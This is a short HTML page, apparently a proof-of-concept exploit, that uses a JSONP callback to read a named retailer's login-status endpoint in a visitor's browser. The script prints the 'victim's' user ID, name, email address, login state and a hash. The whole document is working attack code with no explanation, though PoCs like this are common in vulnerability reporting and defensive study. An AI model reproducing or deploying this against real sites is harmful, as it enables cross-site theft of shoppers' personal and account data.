<script type="text/javascript">

function myCallback(data) {
    var len = data.length;
    alert(len);
    for (var i=0; i<len; i++) {
        document.write('Victim has data: <br>'+
        'Kohl User ID: '+data[i].kohlsUserId+'<br>'+
        'User FirstName: '+ data[i].firstname+'<br>'+
        'User LastName: '+data[i].lastname+'<br>'+
        'User Email Address: '+data[i].emailAddress+'<br>'+
        'User Logged In: '+data[i].userLoggedIn+'<br>'+
        'New Hash: '+data[i].newhash+'<br><br>');
    }
}
</script>
<script src='https://www.kohls.com/upgrade/myaccount/login_status.jsp?callback=myCallback'></script>
